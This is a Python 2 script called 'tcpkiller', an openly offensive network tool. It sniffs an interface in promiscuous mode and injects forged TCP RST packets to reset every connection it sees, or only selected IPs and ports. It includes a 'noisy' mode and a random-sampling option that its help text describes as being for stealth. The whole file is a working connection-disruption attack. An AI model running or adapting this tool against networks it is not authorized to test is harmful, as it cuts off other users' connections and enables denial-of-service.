#!/usr/bin/env python

import binascii
import socket
import struct
import argparse
import sys
import logging
import os
import traceback
import socket

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import Ether, IP, IPv6, TCP, sendp, conf, sniff
from random import randint
###############################################################
# Handle Arguements                                           #
###############################################################

def args_error():
    parser.print_usage()
    sys.exit()

def validate_ips(ips):
    clean = []
    if ips == None:
        return []
    for ip in ips:
        if "," in ip:
            ips += filter(None, ip.split(","))
        else:
            try:
                if ":" in ip:
                    socket.inet_pton(socket.AF_INET6, ip)
                else:
                    socket.inet_pton(socket.AF_INET, ip)
                if not ip in clean: 
                    clean.append(ip)
            except Exception as e:
                print e
                print("error: invalid ip address \"%s\", exiting." % ip)
                return None
        
    return clean

def is_int(s):
    try: 
        int(s)
        return True
    except ValueError:
        return False

def validate_ports(ports):
    clean = []
    if ports != None:
        for port in ports:
            if "," in port:
                ports += port.split(",")
            elif "-" in port:
                low, high = port.split("-")
                if not is_int(low) or not is_int(high):
                    print("error: invalid port range \"%s\", exiting." % port)
                    return None
            elif not is_int(port):
                return None
            clean.append(port)
        return clean
    return []

def validate_args(args):
    for arg in ["allow", "allow_source", "allow_destination", "target", "target_source", "target_destination"]:
        if arg in args and args[arg] != None and not validate_ips(args[arg]):
            args_error()
    for arg in ["allow_port", "allow_source_port", "allow_destination_port", "target_port", "target_source_port", "target_destination_port"]: 
        if arg in args and args[arg] != None and not validate_ports(args[arg]):
            args_error()
 
def print_inits(action, engage, targets, typ):
    if targets:
        if typ == "IP":
            print("[*] %s all connections %s %s." % (action, engage, ", ".join(targets)))
        else:
            print("[*] %s all connections %sover port%s %s." %(action, engage, ("" if len(targets) == 1 else "s"), ", ".join(targets)))



VERBOSE = False
allow = allow_source = allow_destination = []
target = target_source = target_destination = []
aports = allow_sport = allow_dport = []
tports = target_sport = target_dport = []
ranges = {}

parser = argparse.ArgumentParser(description="Attempts to reset all ipv4 tcp connections.", epilog="tcpkiller must be run as root. If no targets [-t|-ts|-td] are given, default is to attack all seen tcp connections.")
parser.add_argument('-i', '--interface', required=True, help="interface to listen and send on")
parser.add_argument('-a', '--allow', nargs="*", help="do not attack this ip address's connections, whether it's the source or destination of a packet",metavar='')
parser.add_argument('-as', '--allow-source', nargs="*", help="do not attack this ip address's connections, but only if it's the source of a packet",metavar='')
parser.add_argument('-ad', '--allow-destination', nargs="*", help="do not attack this ip address's connections, but only if it's the destination of a packet",metavar='')
parser.add_argument('-t', '--target', nargs="*", help="actively target given ip address, whether it is the source or destination of a packet",metavar='')
parser.add_argument('-ts', '--target-source', nargs="*", help="actively target this ip address, but only if it's the source",metavar='')
parser.add_argument('-td', '--target-destination', nargs="*", help="actively target this ip address, but only if it's the destination of a packet",metavar='')
parser.add_argument('-o', '--allow-port', nargs="*", help="do not attack any connections involving this port, whether it's the source or destination of a packet",metavar='')
parser.add_argument('-os', '--allow-source-port', nargs="*", help="do not attack any connections involving this port, but only if it's the source of a packet",metavar='')
parser.add_argument('-od', '--allow-destination-port', nargs="*", help="do not attack any connections involving this port, but only if it's the destination of a packet",metavar='')
parser.add_argument('-p', '--target-port', nargs="*", help="actively target any connections involving these ports whether it is the source or destination of a packet",metavar='')
parser.add_argument('-ps', '--target-source-port', nargs="*", help="actively target any connections involving this port, but only if it's the source",metavar='')
parser.add_argument('-pd', '--target-destination-port', nargs="*", help="actively target any connections involving this port, but only if it's the destination of a packet",metavar='')
parser.add_argument('-n', '--noisy', help="sends many more packets to attempt connection resets to increase effectiveness", default=False, action="store_true")
parser.add_argument('-s', '--silent', help="silence all terminal output", default=False, action="store_true")
parser.add_argument('-r', '--randomize', help="target only SOME of the matching packets for increased stealthiness. defaults to \"all\"", choices=["often", "half", "seldom", "all"], default="all")
parser.add_argument('-v', '--verbose', help="verbose output", default=False, action="store_true")


args = vars(parser.parse_args())
validate_args(args)

if __name__ == "__main__":
    if os.getuid()!=0:
        print "error: not running as root."
        parser.print_usage()
        sys.exit()

iface = args["interface"]
verbose = args["verbose"]
noisy = args["noisy"]
silent = args["silent"]
randomize = args["randomize"]

allow = validate_ips(args["allow"])
allow_src = validate_ips(args["allow_source"])
allow_dst = validate_ips(args["allow_destination"])
target = validate_ips(args["target"])
target_src = validate_ips(args["target_source"])
target_dst = validate_ips(args["target_destination"])

allow_ports = validate_ports(args["allow_port"])
allow_sport = validate_ports(args["allow_source_port"])
allow_dport = validate_ports(args["allow_destination_port"])
target_ports = validate_ports(args["target_port"])
target_sport = validate_ports(args["target_source_port"])
target_dport = validate_ports(args["target_destination_port"])

if not silent: 
    print("[*] Initialized tcpkiller on %s in %s mode, targeting %s%s. Press Ctrl-C to exit." %(iface, ("noisy" if noisy else "quiet"),(args["randomize"]), (" with verbosity enabled" if verbose else "")))

    print_inits("Allowing", "involving", allow, "IP")
    print_inits("Allowing", "originating from", allow_src, "IP")
    print_inits("Allowing", "coming from", allow_dst, "IP")
    print_inits("Targeting", "involving", target, "IP")
    print_inits("Targeting", "originating from", target_src, "IP")
    print_inits("Targeting", "coming from", target_dst, "IP")

    print_inits("Allowing", "", allow_ports, "port")
    print_inits("Allowing", "originating from", allow_sport, "port")
    print_inits("Allowing", "coming from", allow_dport, "port")
    print_inits("Targeting", "", target_ports, "port")
    print_inits("Targeting", "originating from", target_sport, "port")
    print_inits("Targeting", "coming from", target_dport, "port")


###############################################################
# Packet Handling                                             #
###############################################################

# Given command line arguements, method determines if this packet should be responded to
def ignore_packet(packet, proto):
    src_ip = packet[proto].src
    dst_ip = packet[proto].dst
    src_port = packet[TCP].sport
    dst_port = packet[TCP].dport
    
    # Target or allow by IP
    if (src_ip in allow or dst_ip in allow) or (src_ip in allow_src) or (dst_ip in allow_dst):
        return True
    elif (target and (not src_ip in target and not dst_ip in target)) or (target_src and not src_ip in target_src) or (target_dst and not dst_ip in target_dst):
        return True
    
    # Target or allow by Port
    if (src_port in allow_ports or dst_port in allow_ports) or (src_port in allow_sport) or (dst_port in allow_dport):
        return True
    elif (target_ports and (not src_port in target_ports and not dst_port in target_ports)) or (target_sport and not src_port in target_sport) or (target_dport and not dst_port in target_dport):
        return True

    # Target randomly
    if randomize == "often" and randint(1,10) < 2:
        return True
    elif randomize == "half" and randint(1,10) < 5:
        return True
    elif randomize == "seldom" and randint(1, 10) < 8:
        return True
    else:
        return False

def send(packet):
    s.send(packet)

def build_packet(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, seq, proto):
    eth = Ether(src=src_mac, dst=dst_mac, type=0x800)
    if proto == IP:
        ip = IP(src=src_ip, dst=dst_ip)
    elif proto == IPv6:
        ip = IPv6(src=src_ip, dst=dst_ip)
    else:
        return str(eth) #if unknown L2 protocol, send back dud ether packet
    tcp = TCP(sport=src_port, dport=dst_port, seq=seq, flags="R")
    return str(eth/ip/tcp)

###############################################################
# Scapy                                                       #
###############################################################

def callback(packet):
    flags = packet.sprintf("%TCP.flags%")
    proto = IP
    if IPv6 in packet:
         proto = IPv6
    if flags == "A" and not ignore_packet(packet, proto):
        src_mac = packet[Ether].src
        dst_mac = packet[Ether].dst
        src_ip = packet[proto].src
        dst_ip = packet[proto].dst
        src_port = packet[TCP].sport
        dst_port = packet[TCP].dport
        seq = packet[TCP].seq
        ack = packet[TCP].ack
        if verbose:
            print("RST from %s:%s (%s) --> %s:%s (%s) w/ %s" % (src_ip, src_port, src_mac, dst_ip, dst_port, dst_mac, ack))
        if noisy:
            send(build_packet(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, seq, proto))
        send(build_packet(dst_mac, src_mac, dst_ip, src_ip, dst_port, src_port, ack, proto))

s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
s.bind((iface, 0))

conf.sniff_promisc = True
sniff(filter='tcp', prn=callback, store=0, promisc=1)
